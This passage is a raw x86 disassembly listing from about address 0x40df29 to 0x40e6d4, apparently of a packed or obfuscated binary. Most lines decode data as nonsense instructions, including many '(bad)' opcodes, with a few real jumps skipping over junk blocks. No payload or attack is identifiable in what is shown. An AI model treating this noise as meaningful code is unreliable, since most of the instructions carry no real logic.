  40df29:	jae    0x40df2b
  40df2b:	loopne 0x40df8a
  40df2d:	ins    DWORD PTR es:[edi],dx
  40df2e:	push   cs
  40df2f:	pop    ss
  40df30:	mov    ah,0x47
  40df32:	out    dx,eax
  40df33:	adc    DWORD PTR [ebp+0x2dddb593],edx
  40df39:	push   ss
  40df3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df3b:	push   cs
  40df3c:	adc    BYTE PTR [ebp-0x74],cl
  40df3f:	mov    ecx,0xd146c4cb
  40df44:	cmp    BYTE PTR [esi],al
  40df46:	outs   dx,DWORD PTR ds:[esi]
  40df47:	pop    es
  40df48:	inc    ecx
  40df49:	xlat   BYTE PTR ds:[ebx]
  40df4a:	inc    esi
  40df4b:	les    edi,FWORD PTR [ecx-0x5aa45a53]
  40df51:	sti    
  40df52:	leave  
  40df53:	neg    DWORD PTR [edx]
  40df55:	sub    eax,0x31743470
  40df5a:	sub    bh,ah
  40df5c:	push   ecx
  40df5d:	mov    DWORD PTR [eax+0x4df00c28],edi
  40df63:	mov    ebx,0xe5934468
  40df68:	shr    DWORD PTR [esi+ecx*4],cl
  40df6b:	fcmovb st,st(5)
  40df6d:	cmp    esi,edi
  40df6f:	std    
  40df70:	enter  0xe068,0xf8
  40df74:	adc    eax,0x9acd4777
  40df79:	in     al,dx
  40df7a:	or     eax,0x9f7952c0
  40df7f:	in     eax,dx
  40df80:	sahf   
  40df81:	lods   eax,DWORD PTR ds:[esi]
  40df82:	fucom  st(6)
  40df84:	daa    
  40df85:	es push eax
  40df87:	or     BYTE PTR [eax+0x6b],dl
  40df8a:	lock outs dx,BYTE PTR ds:[esi]
  40df8c:	mov    eax,ebp
  40df8e:	imul   ebx,DWORD PTR [edx],0x3a
  40df91:	and    ebx,esp
  40df93:	jmp    0x85a6b36b
  40df98:	leave  
  40df99:	loopne 0x40df50
  40df9b:	pop    eax
  40df9c:	std    
  40df9d:	cmp    cl,al
  40df9f:	rcl    BYTE PTR [ecx+0x4b],cl
  40dfa2:	icebp  
  40dfa3:	dec    edi
  40dfa4:	loop   0x40df7c
  40dfa6:	mov    cs,esp
  40dfa8:	nop
  40dfa9:	retf   
  40dfaa:	xor    al,0x71
  40dfac:	stc    
  40dfad:	pushf  
  40dfae:	sbb    DWORD PTR [esi],ecx
  40dfb0:	popa   
  40dfb1:	mov    eax,0xca1e346
  40dfb6:	push   esi
  40dfb7:	jmp    0x290e:0x6d62c85c
  40dfbe:	scas   al,BYTE PTR es:[edi]
  40dfbf:	mov    ch,0x8a
  40dfc1:	push   0x18
  40dfc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfc4:	cmp    eax,0x8a500d59
  40dfc9:	mov    eax,0xf47e8c5b
  40dfce:	cli    
  40dfcf:	fist   DWORD PTR ds:0xcd69886f
  40dfd5:	dec    eax
  40dfd6:	adc    DWORD PTR [eax+0x1c],ecx
  40dfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfda:	or     BYTE PTR [edi+eiz*1],cl
  40dfdd:	pop    edx
  40dfde:	cld    
  40dfdf:	or     al,BYTE PTR [ebp-0x4]
  40dfe2:	fdivr  QWORD PTR [ecx]
  40dfe4:	fwait
  40dfe5:	ja     0x40dfd2
  40dfe7:	lds    esp,FWORD PTR [eax]
  40dfe9:	mov    edi,0x35213749
  40dfee:	pop    esi
  40dfef:	fldenv [ebx-0x6c50bf8f]
  40dff5:	add    cl,BYTE PTR [ecx]
  40dff7:	into   
  40dff8:	mov    ebx,0x49db9465
  40dffd:	add    eax,0x1eae8625
  40e002:	test   al,0x5c
  40e004:	cmp    DWORD PTR [ecx+0x6d],eax
  40e007:	sub    eax,DWORD PTR [ebp+0x34]
  40e00a:	and    al,0xe2
  40e00c:	mov    dh,bh
  40e00e:	or     BYTE PTR [ebx+0x62],dl
  40e011:	jne    0x40e045
  40e013:	pop    es
  40e014:	mov    BYTE PTR [ebp+0x2b8309d2],ah
  40e01a:	dec    esi
  40e01b:	loope  0x40e08c
  40e01d:	xchg   esi,eax
  40e01e:	xchg   ebx,eax
  40e01f:	inc    edi
  40e020:	mov    eax,DWORD PTR [edi-0x57de1adc]
  40e026:	xchg   esp,eax
  40e027:	ds mov ah,0x48
  40e02a:	fistp  QWORD PTR [ebp-0x3e]
  40e02d:	xchg   esi,eax
  40e02e:	dec    esi
  40e02f:	es in  eax,dx
  40e031:	test   eax,0xa9edbfa7
  40e036:	call   0x8233:0xb9bcd90c
  40e03d:	add    eax,0xe17d477f
  40e042:	dec    esi
  40e043:	dec    esi
  40e044:	sbb    BYTE PTR [eax+0x6e92b0fe],al
  40e04a:	fidiv  DWORD PTR [esi+0x33bc7991]
  40e050:	inc    DWORD PTR [ebx]
  40e052:	retf   
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434296
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0xf253baa7
  40e071:	lds    ebx,FWORD PTR [ebx+0x707092f9]
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e04a
  40e07c:	cmp    BYTE PTR [edx+eax*1],ch
  40e07f:	xchg   dl,cl
  40e081:	adc    bh,ch
  40e083:	xchg   edi,eax
  40e084:	gs mov edi,0x5d578f27
  40e08a:	push   ss
  40e08b:	or     edx,DWORD PTR [esi+0x16]
  40e08e:	std    
  40e08f:	(bad)  
  40e090:	sti    
  40e091:	out    dx,al
  40e092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e093:	xchg   edi,eax
  40e094:	mov    al,ds:0x9f45c57
  40e099:	sub    ebx,DWORD PTR [esi+0x39]
  40e09c:	jecxz  0x40e0fd
  40e09e:	in     al,0xbd
  40e0a0:	std    
  40e0a1:	push   0xa5f3e9f9
  40e0a6:	(bad)  
  40e0a7:	shl    BYTE PTR [ebx+0x3be2f03b],1
  40e0ad:	xchg   edi,eax
  40e0ae:	cmp    eax,0x12ef296f
  40e0b3:	adc    al,0x39
  40e0b5:	pmuludq mm0,QWORD PTR [edi]
  40e0b8:	dec    edx
  40e0b9:	cdq    
  40e0ba:	cmp    DWORD PTR [edi],ecx
  40e0bc:	xchg   edx,esi
  40e0be:	push   esp
  40e0bf:	jl     0x40e0bb
  40e0c1:	cmp    eax,0x9168bbfb
  40e0c6:	out    dx,al
  40e0c7:	ins    BYTE PTR es:[edi],dx
  40e0c8:	push   ss
  40e0c9:	inc    ebx
  40e0ca:	je     0x40e0b9
  40e0cc:	push   ebx
  40e0cd:	ret    
  40e0ce:	or     DWORD PTR ss:[edx-0x4a],esi
  40e0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0d3:	(bad)  
  40e0d4:	dec    ebp
  40e0d5:	outs   dx,DWORD PTR ds:[esi]
  40e0d6:	scas   eax,DWORD PTR es:[edi]
  40e0d7:	push   cs
  40e0d8:	mov    ds:0xc7b08bca,al
  40e0dd:	inc    ebx
  40e0de:	retf   0x2cc2
  40e0e1:	fdivr  st(4),st
  40e0e3:	mov    dh,0xb6
  40e0e5:	mov    eax,ds:0xcf482808
  40e0ea:	in     al,0xd0
  40e0ec:	dec    edx
  40e0ed:	fmul   QWORD PTR [edi-0x2a7234ec]
  40e0f3:	outs   dx,BYTE PTR ds:[esi]
  40e0f4:	pop    edi
  40e0f5:	js     0x40e12e
  40e0f7:	cwde   
  40e0f8:	jl     0x40e0ad
  40e0fa:	dec    ecx
  40e0fb:	sbb    eax,0xffffff99
  40e0fe:	cmc    
  40e0ff:	and    bh,dl
  40e101:	dec    eax
  40e102:	mov    dh,cl
  40e104:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40e106:	jbe    0x40e167
  40e108:	call   0x6146:0x8e7b5f85
  40e10f:	mov    esi,esp
  40e111:	test   DWORD PTR cs:[ebx],esp
  40e114:	push   0x78bf073e
  40e119:	or     ch,BYTE PTR [edx+0x62]
  40e11c:	mov    ah,0xd5
  40e11e:	mov    DWORD PTR [esi-0x22a90bbe],eax
  40e124:	adc    BYTE PTR [ecx-0x11],0xf0
  40e128:	inc    edi
  40e129:	mov    esp,?
  40e12b:	sub    al,0xf6
  40e12d:	out    dx,eax
  40e12e:	mov    fs,WORD PTR [eax-0x13]
  40e131:	(bad)  
  40e133:	and    DWORD PTR ss:[esi],edi
  40e136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e137:	sub    DWORD PTR [eax-0x23d0a37f],edx
  40e13d:	dec    ecx
  40e13e:	aam    0xc5
  40e140:	mov    ah,0xc7
  40e142:	data16 xlat BYTE PTR ds:[ebx]
  40e144:	retf   
  40e145:	xlat   BYTE PTR ds:[ebx]
  40e146:	sbb    BYTE PTR [edi],ah
  40e148:	pusha  
  40e149:	dec    eax
  40e14a:	gs in  al,0xb9
  40e14d:	mov    ebp,0xd98acf58
  40e152:	es test eax,0x9b8f3eb3
  40e158:	dec    eax
  40e159:	lods   eax,DWORD PTR ds:[esi]
  40e15a:	dec    ebx
  40e15b:	pop    edx
  40e15c:	dec    esp
  40e15d:	sub    eax,0x91940847
  40e162:	stc    
  40e163:	call   0xa3775218
  40e168:	es call 0x9c91:0xe2fd5d34
  40e170:	adc    eax,0x6cc1a273
  40e175:	test   eax,0x75bcb2de
  40e17a:	out    0x87,eax
  40e17c:	test   BYTE PTR [ecx-0x19380b1a],0x52
  40e183:	adc    dh,BYTE PTR [edx-0x3a65b4a8]
  40e189:	cmp    BYTE PTR [edx],ah
  40e18b:	rol    BYTE PTR [edx-0x3d],0xda
  40e18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e190:	and    BYTE PTR [eax+0x1902d5d8],dl
  40e196:	outs   dx,BYTE PTR ds:[esi]
  40e197:	(bad)  
  40e198:	and    BYTE PTR [ebx+0x385f7acf],dl
  40e19e:	pop    ecx
  40e19f:	in     eax,dx
  40e1a0:	sbb    BYTE PTR [esi+0x54613d8c],bh
  40e1a6:	in     eax,dx
  40e1a7:	cld    
  40e1a8:	imul   esi,DWORD PTR [ebp+0x7af6a645],0xb344e6b1
  40e1b2:	cs mov bl,0xf0
  40e1b5:	cmc    
  40e1b6:	mov    es,WORD PTR [edx+0x364cac98]
  40e1bc:	into   
  40e1bd:	mov    ecx,0xc01e79ff
  40e1c2:	mov    al,ds:0x5457f407
  40e1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1c8:	adc    ecx,ebx
  40e1ca:	and    eax,0x91698755
  40e1cf:	ins    DWORD PTR es:[edi],dx
  40e1d0:	mov    cl,0x4e
  40e1d2:	mov    ecx,0x5862ab47
  40e1d7:	iret   
  40e1d8:	push   ebx
  40e1d9:	jl     0x40e185
  40e1db:	call   0x2805:0xb71186df
  40e1e2:	adc    edi,ebx
  40e1e4:	push   cs
  40e1e5:	(bad)  
  40e1e6:	fdiv   st,st(4)
  40e1e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e9:	pop    ds
  40e1ea:	dec    edi
  40e1eb:	sub    edx,DWORD PTR [eax-0x25276b02]
  40e1f1:	cli    
  40e1f2:	cmp    al,0xb7
  40e1f4:	dec    eax
  40e1f5:	(bad)
  40e1f9:	cmp    al,0x63
  40e1fb:	adc    bh,cl
  40e1fd:	mov    esp,0xe1880ab5
  40e202:	call   0xf555:0xd794c0ee
  40e209:	xchg   ebx,eax
  40e20a:	push   cs
  40e20b:	dec    ecx
  40e20c:	mov    eax,eax
  40e20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e20f:	scas   al,BYTE PTR es:[edi]
  40e210:	xchg   ecx,eax
  40e211:	lock jl 0x40e26f
  40e214:	xor    BYTE PTR [esi+edi*4+0x658fb1da],cl
  40e21b:	or     DWORD PTR [ecx],ecx
  40e21d:	mov    ch,0xd0
  40e21f:	mov    edx,0x67ae4ad5
  40e224:	mov    ebx,0xdf8685bf
  40e229:	pop    ss
  40e22a:	jp     0x40e1de
  40e22c:	loope  0x40e20b
  40e22e:	mov    ebx,0xc0dc9ed8
  40e233:	test   eax,0x6b0b0557
  40e238:	int    0xd1
  40e23a:	shl    ebx,0x7d
  40e23d:	fwait
  40e23e:	ss jo  0x40e1e0
  40e241:	xchg   ecx,eax
  40e242:	jecxz  0x40e2b5
  40e244:	inc    esp
  40e245:	sub    ecx,DWORD PTR [ecx+0x26bd299d]
  40e24b:	jns    0x40e234
  40e24d:	test   DWORD PTR [eax-0x35c9f3bf],ecx
  40e253:	inc    ebp
  40e254:	ja     0x40e2b9
  40e256:	pop    ss
  40e257:	adc    BYTE PTR [edx],dl
  40e259:	push   0x77
  40e25b:	xlat   BYTE PTR ds:[ebx]
  40e25c:	pop    eax
  40e25d:	or     ebx,ebp
  40e25f:	retf   0x47cb
  40e262:	sbb    ebp,DWORD PTR ds:0xcd944c76
  40e268:	xchg   ebx,eax
  40e26a:	and    al,0x88
  40e26c:	inc    edi
  40e26d:	stos   BYTE PTR es:[edi],al
  40e26e:	sub    edi,ecx
  40e270:	or     DWORD PTR [eax+0x263372e8],0xd6ed6d7f
  40e27a:	adc    eax,0x83635ec8
  40e27f:	push   ss
  40e280:	in     eax,0x28
  40e282:	add    edx,DWORD PTR [ebx+0x72d27f14]
  40e288:	sbb    DWORD PTR [esi-0x5a70f7c1],esi
  40e28e:	fdivr  DWORD PTR [edi+0x131e1ead]
  40e294:	call   0x3f68:0x3cc130e1
  40e29b:	add    ah,BYTE PTR [esp+ebx*8]
  40e29e:	push   cs
  40e29f:	inc    ebx
  40e2a0:	pop    es
  40e2a1:	loop   0x40e2c9
  40e2a3:	jp     0x40e2c5
  40e2a5:	xor    eax,0xa27bb023
  40e2aa:	sub    eax,0x9ce5ae80
  40e2af:	inc    ecx
  40e2b0:	add    bl,BYTE PTR [edx+0x351b2c36]
  40e2b6:	push   esi
  40e2b7:	mov    cl,0xdf
  40e2b9:	cmc    
  40e2ba:	pop    ss
  40e2bb:	and    ecx,DWORD PTR [esp+eax*2]
  40e2be:	(bad)  
  40e2bf:	mov    esp,0xc23caf30
  40e2c4:	out    dx,al
  40e2c5:	(bad)  
  40e2c8:	das    
  40e2c9:	or     dl,BYTE PTR [eax]
  40e2cb:	iret   
  40e2cc:	retf   
  40e2cd:	aaa    
  40e2ce:	cli    
  40e2cf:	mov    ah,0xd7
  40e2d1:	lea    ebx,ds:0x860a18fe
  40e2d7:	pusha  
  40e2d8:	mov    eax,esi
  40e2da:	mov    cl,0x53
  40e2dc:	mov    gs:0x1fcf3cb2,eax
  40e2e2:	cli    
  40e2e3:	sub    eax,0xd4a13320
  40e2e8:	cmp    DWORD PTR [esi-0x12],ecx
  40e2eb:	call   0xae782ed9
  40e2f0:	sub    al,0x7b
  40e2f2:	jb     0x40e2bd
  40e2f4:	xor    eax,0xd64acd40
  40e2f9:	aad    0xb
  40e2fb:	stos   BYTE PTR es:[edi],al
  40e2fc:	and    al,0xb1
  40e2fe:	daa    
  40e2ff:	pop    ecx
  40e300:	jecxz  0x40e33a
  40e302:	pop    es
  40e303:	xchg   edx,eax
  40e304:	add    eax,0xd865280
  40e309:	das    
  40e30a:	xor    al,0x9
  40e30c:	ret    
  40e30d:	push   edi
  40e30e:	mov    edx,ebp
  40e310:	cdq    
  40e311:	shr    DWORD PTR [esi+0x2c8dfa80],0xc3
  40e318:	stos   DWORD PTR es:[edi],eax
  40e319:	aam    0x26
  40e31b:	lahf   
  40e31c:	shl    dh,0x74
  40e31f:	jecxz  0x40e33e
  40e321:	adc    al,0x99
  40e323:	aaa    
  40e324:	xor    edx,DWORD PTR [ebx]
  40e326:	and    BYTE PTR [edi+0x26],bh
  40e329:	sbb    bl,al
  40e32b:	pop    edi
  40e32c:	outs   dx,DWORD PTR ds:[esi]
  40e32d:	xlat   BYTE PTR ds:[ebx]
  40e32e:	mov    bl,0x41
  40e330:	xchg   edi,eax
  40e331:	popf   
  40e332:	jb     0x40e397
  40e334:	gs jb  0x40e2c5
  40e337:	pop    es
  40e338:	hlt    
  40e339:	jae    0x40e36b
  40e33b:	push   cs
  40e33c:	lods   eax,DWORD PTR ds:[esi]
  40e33d:	inc    esp
  40e33e:	icebp  
  40e33f:	mov    WORD PTR [ecx],cs
  40e341:	cwde   
  40e342:	loop   0x40e325
  40e344:	jmp    0xdb8fd6c6
  40e349:	test   DWORD PTR [esi],0xa8768ea2
  40e34f:	fnstcw WORD PTR [eax]
  40e351:	adc    al,0x26
  40e353:	sbb    bh,BYTE PTR [esi]
  40e355:	icebp  
  40e356:	mov    ah,0x65
  40e358:	pop    ebx
  40e359:	jle    0x40e2f0
  40e35b:	rcl    DWORD PTR [ecx-0x25],cl
  40e35e:	mov    esi,DWORD PTR [edi+esi*4+0x46]
  40e362:	xchg   esp,eax
  40e363:	jge    0x40e3ad
  40e365:	mov    esp,0xeaa9026d
  40e36a:	mov    al,ds:0x7519245
  40e36f:	push   eax
  40e370:	xchg   edx,eax
  40e371:	adc    ebp,DWORD PTR [ebx]
  40e373:	cmp    DWORD PTR [ecx+0x52bceaf8],0xffffff98
  40e37a:	or     BYTE PTR [edx-0x75e4c1a5],al
  40e380:	ret    
  40e381:	and    DWORD PTR [edx+0x7c93e4a3],esi
  40e387:	retf   
  40e388:	push   ebx
  40e389:	add    eax,0xad4db8a8
  40e38e:	pop    ss
  40e38f:	inc    edx
  40e390:	push   0x9c9884e6
  40e395:	add    eax,0x1cd4be46
  40e39a:	repnz cmp ecx,ebp
  40e39d:	xor    DWORD PTR [eax-0x3cd6f9e9],ebp
  40e3a3:	imul   esp,DWORD PTR [esi],0x543e49ed
  40e3a9:	inc    edx
  40e3aa:	jl     0x40e33e
  40e3ac:	push   esi
  40e3ad:	lds    bx,DWORD PTR [ebx-0x65]
  40e3b1:	adc    ebp,eax
  40e3b3:	mov    edx,0x7bb33ee
  40e3b8:	cmp    eax,0xa59c8f66
  40e3bd:	sbb    DWORD PTR [ebx+0x52],edx
  40e3c0:	jne    0x40e3c1
  40e3c2:	popa   
  40e3c3:	ror    BYTE PTR [ecx-0x25e6e3b3],cl
  40e3c9:	inc    edx
  40e3ca:	or     esp,DWORD PTR [ebx+0x2461b225]
  40e3d0:	inc    edi
  40e3d1:	adc    BYTE PTR [ebx-0x2e2e2a6c],dh
  40e3d7:	cmp    eax,0x3f6e3bcc
  40e3dc:	(bad)  
  40e3dd:	adc    eax,0x4c2eb4b1
  40e3e2:	call   esi
  40e3e4:	dec    ebp
  40e3e5:	mov    edx,0x79fcf14f
  40e3ea:	mov    dh,0x48
  40e3ec:	lods   eax,DWORD PTR ds:[esi]
  40e3ed:	sub    eax,0x69b93841
  40e3f2:	fwait
  40e3f3:	xchg   esp,eax
  40e3f4:	test   eax,0xcb2e8add
  40e3f9:	bound  esi,QWORD PTR ds:0xfdbc015f
  40e3ff:	pop    es
  40e400:	push   0x88cc04aa
  40e405:	push   0xffffffd6
  40e407:	aam    0x3d
  40e409:	add    ebp,DWORD PTR [esi+0x7389cadd]
  40e40f:	push   ds
  40e410:	enter  0xdff9,0x31
  40e414:	xor    al,BYTE PTR cs:[ebx-0x50]
  40e418:	das    
  40e419:	daa    
  40e41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e41b:	adc    ah,cl
  40e41d:	ins    DWORD PTR es:[edi],dx
  40e41e:	xchg   ebp,eax
  40e41f:	aas    
  40e420:	mov    DWORD PTR [ebx-0x6ddd8339],eax
  40e426:	push   ebp
  40e427:	fdivr  DWORD PTR [ecx+ebp*8-0x7b]
  40e42b:	ds ret 
  40e42d:	sbb    BYTE PTR [ecx-0x41de57a],ch
  40e433:	icebp  
  40e434:	jmp    0x4a02:0x6b156c5b
  40e43b:	mov    ds,WORD PTR [ebx-0x18]
  40e43e:	test   al,0xa9
  40e440:	cld    
  40e441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e442:	ins    DWORD PTR es:[edi],dx
  40e443:	out    dx,eax
  40e444:	aaa    
  40e445:	pop    ebx
  40e446:	fild   QWORD PTR [edi-0x639281ea]
  40e44c:	scas   eax,DWORD PTR es:[edi]
  40e44d:	sbb    eax,0xed5f1856
  40e452:	je     0x40fd56
  40e458:	movzx  eax,BYTE PTR ds:0x434282
  40e45f:	add    DWORD PTR ds:0x43431d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432cda,0x4325f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432cc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434292,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	dec    esp
  40e4ba:	(bad)  
  40e4bb:	or     eax,0x709ed24e
  40e4c0:	jo     0x40e50b
  40e4c2:	jge    0x40e534
  40e4c4:	jo     0x40e518
  40e4c6:	cld    
  40e4c7:	mov    edx,0xbcf30707
  40e4cc:	fadd   st(6),st
  40e4ce:	sahf   
  40e4cf:	mov    esp,0xdf3a31ae
  40e4d4:	fwait
  40e4d5:	lds    ebp,FWORD PTR [edx+0xb]
  40e4d8:	sbb    ecx,DWORD PTR [edx+0x59e2130]
  40e4de:	pop    ss
  40e4df:	sub    edi,ebp
  40e4e1:	and    DWORD PTR [eax+0x4351d139],ecx
  40e4e7:	ins    BYTE PTR es:[edi],dx
  40e4e8:	cmp    al,ch
  40e4ea:	mov    ds:0x8d65b844,eax
  40e4ef:	and    DWORD PTR [esi],0x97f6fad
  40e4f5:	ds test edx,ebx
  40e4f8:	mov    ch,BYTE PTR [ecx-0x7c]
  40e4fb:	pop    edx
  40e4fc:	sbb    BYTE PTR [edi],ch
  40e4fe:	push   ss
  40e4ff:	cmovl  edi,DWORD PTR [ecx-0x47]
  40e503:	(bad)  
  40e504:	mov    edi,0xbb64c70c
  40e509:	xor    bl,bl
  40e50b:	and    edx,DWORD PTR [ecx-0x5d]
  40e50e:	adc    al,0x70
  40e510:	loope  0x40e4de
  40e512:	xchg   ecx,eax
  40e513:	mov    esi,0xfee46127
  40e518:	popa   
  40e519:	hlt    
  40e51a:	jle    0x40e540
  40e51c:	pop    eax
  40e51d:	pushf  
  40e51e:	addr16 adc ch,ch
  40e521:	cld    
  40e522:	push   0x32
  40e524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e525:	jp     0x40e500
  40e527:	outs   dx,BYTE PTR ds:[esi]
  40e528:	in     al,dx
  40e529:	inc    ecx
  40e52a:	ja     0x40e563
  40e52c:	mov    ecx,0xecd40bf5
  40e531:	(bad)  
  40e532:	xor    eax,0xb644bafc
  40e537:	cmp    dl,BYTE PTR [ecx+0x721e72cb]
  40e53d:	adc    dl,BYTE PTR cs:[ebx]
  40e540:	jecxz  0x40e5bf
  40e542:	sti    
  40e543:	stc    
  40e544:	in     eax,dx
  40e545:	pop    edx
  40e546:	xchg   DWORD PTR [edx],esp
  40e548:	sbb    al,0x5
  40e54a:	and    al,0x26
  40e54c:	loope  0x40e50b
  40e54e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e54f:	bound  eax,QWORD PTR [ebp+0x775e129c]
  40e555:	bound  edx,QWORD PTR [esi+0x622c2e55]
  40e55b:	push   ds
  40e55c:	pop    ebx
  40e55d:	sub    al,0xf8
  40e55f:	sbb    al,0x4
  40e561:	mov    edi,0x532b6bf6
  40e566:	pushf  
  40e567:	pop    edi
  40e568:	lods   eax,DWORD PTR ds:[esi]
  40e569:	jle    0x40e556
  40e56b:	jbe    0x40e5b2
  40e56d:	in     al,dx
  40e56e:	inc    esi
  40e56f:	dec    ecx
  40e570:	add    DWORD PTR [ebx-0x59],esi
  40e573:	(bad)  
  40e574:	je     0x40e55a
  40e576:	js     0x40e5cd
  40e578:	nop
  40e579:	jl     0x40e5ec
  40e57b:	mov    dh,0x83
  40e57d:	ins    DWORD PTR es:[edi],dx
  40e57e:	mov    BYTE PTR [esp+ebp*2+0x28814cce],ah
  40e585:	mov    ah,0xff
  40e587:	inc    ebx
  40e588:	mov    ah,0x1b
  40e58a:	mov    edi,0x6f4a37e6
  40e58f:	mov    dl,0xe8
  40e591:	xor    edi,DWORD PTR [eax-0x54f10588]
  40e597:	push   edx
  40e598:	mov    ch,0x19
  40e59a:	nop
  40e59b:	cmp    al,0x44
  40e59d:	jmp    0x3aaf:0x76703e75
  40e5a4:	mov    esi,0xb5903f68
  40e5a9:	adc    esi,DWORD PTR [ebx+ecx*2-0x2abc2e8c]
  40e5b0:	mov    ebp,DWORD PTR [edi+0xfe08007]
  40e5b6:	mov    ebx,0xacebaddc
  40e5bb:	sub    esi,eax
  40e5bd:	lock stos BYTE PTR es:[edi],al
  40e5bf:	repnz sahf 
  40e5c1:	lock fdivr st,st(4)
  40e5c4:	sub    al,0x8c
  40e5c6:	mov    edi,DWORD PTR [ecx]
  40e5c8:	xchg   BYTE PTR [ecx-0x401eb075],ah
  40e5ce:	mov    ecx,0x7c62e59f
  40e5d3:	xchg   ebp,eax
  40e5d4:	dec    edi
  40e5d5:	loop   0x40e562
  40e5d7:	cmp    DWORD PTR [ebp+0x25432489],eax
  40e5dd:	push   cs
  40e5de:	ja     0x40e59a
  40e5e0:	mov    bl,0x59
  40e5e2:	push   cs
  40e5e3:	jae    0x40e64e
  40e5e5:	shr    DWORD PTR [ebx],cl
  40e5e7:	xor    al,0xa1
  40e5e9:	push   esi
  40e5ea:	inc    edi
  40e5eb:	push   ebx
  40e5ec:	mov    ds:0x5c8e1c98,eax
  40e5f1:	add    eax,0x5a8ff229
  40e5f6:	into   
  40e5f7:	popa   
  40e5f8:	xor    ah,BYTE PTR [ebx+0x21]
  40e5fb:	lods   al,BYTE PTR ds:[esi]
  40e5fc:	mov    al,ds:0xf4127fb7
  40e601:	cmp    DWORD PTR [ebx],0x6
  40e604:	sbb    dh,BYTE PTR [edi+0x2f8635dd]
  40e60a:	jnp    0x40e688
  40e60c:	sbb    BYTE PTR [ebx],bl
  40e60e:	mov    ah,0xb2
  40e610:	jge    0x40e5ed
  40e612:	sbb    BYTE PTR [eax],bl
  40e614:	jle    0x40e68d
  40e616:	cmp    ebx,ebx
  40e618:	ja     0x40e5b4
  40e61a:	loop   0x40e5c3
  40e61c:	xchg   DWORD PTR [esi],ecx
  40e61e:	test   eax,0x23a88e33
  40e623:	jg     0x40e5ad
  40e625:	in     al,dx
  40e626:	(bad)  
  40e627:	das    
  40e628:	mov    esi,0x732216ca
  40e62d:	lods   eax,DWORD PTR ds:[esi]
  40e62e:	(bad)  
  40e630:	arpl   WORD PTR [ebx-0x2563b660],bp
  40e636:	dec    ebx
  40e637:	sub    BYTE PTR ds:0x6a0b604d,0x78
  40e63e:	cs inc ecx
  40e640:	lock mov bh,BYTE PTR ds:0x5704dd3a
  40e647:	imul   ecx,DWORD PTR [edx+0x14d7b571],0xe955c971
  40e651:	imul   esi,ebx,0xe18f2104
  40e657:	xchg   BYTE PTR [ebp+ebx*4+0x52],dl
  40e65b:	fwait
  40e65c:	cs ja  0x40e624
  40e65f:	dec    ebp
  40e660:	cmp    al,0x4a
  40e662:	dec    esi
  40e663:	pop    es
  40e664:	mov    ds:0x629a6ce4,al
  40e669:	and    eax,0xf2059d7c
  40e66e:	ror    DWORD PTR [edx-0x3b],0x43
  40e672:	add    eax,DWORD PTR [edi]
  40e674:	sbb    eax,0xe606e25
  40e679:	push   ebx
  40e67a:	inc    edi
  40e67b:	(bad)  
  40e67c:	neg    DWORD PTR [eax]
  40e67e:	push   ebx
  40e67f:	sar    DWORD PTR [ebx+esi*4-0x47c24ac8],0xe7
  40e687:	(bad)  
  40e689:	pop    ss
  40e68a:	test   al,0x9c
  40e68c:	stos   DWORD PTR es:[edi],eax
  40e68d:	xchg   ebp,eax
  40e68e:	gs ffree st(3)
  40e691:	mov    dl,0xd8
  40e693:	push   eax
  40e694:	mov    ebp,0xbcff63d
  40e699:	xchg   ecx,eax
  40e69a:	pop    eax
  40e69b:	lock mov ebp,0x33059b1c
  40e6a1:	in     eax,0x3e
  40e6a3:	retf   
  40e6a4:	jo     0x40e71d
  40e6a6:	dec    ebx
  40e6a7:	les    edi,FWORD PTR [ebx+0x5]
  40e6aa:	inc    ecx
  40e6ab:	ror    bl,0x6a
  40e6ae:	cdq    
  40e6af:	inc    ecx
  40e6b0:	sub    dl,bh
  40e6b2:	sbb    DWORD PTR [ebx+0x46],0xc4147766
  40e6b9:	pop    ss
  40e6ba:	jbe    0x40e640
  40e6bc:	fimul  WORD PTR [ebp-0x13ce1e6b]
  40e6c2:	enter  0x75a7,0xf3
  40e6c6:	cld    
  40e6c7:	scas   al,BYTE PTR es:[edi]
  40e6c8:	cmp    cl,bl
  40e6ca:	sub    eax,DWORD PTR [esi+0x35cd43e1]
  40e6d0:	std    
  40e6d1:	adc    ebx,DWORD PTR [ecx+0x26]
  40e6d4:	mov    ebx,0x254c8c2d
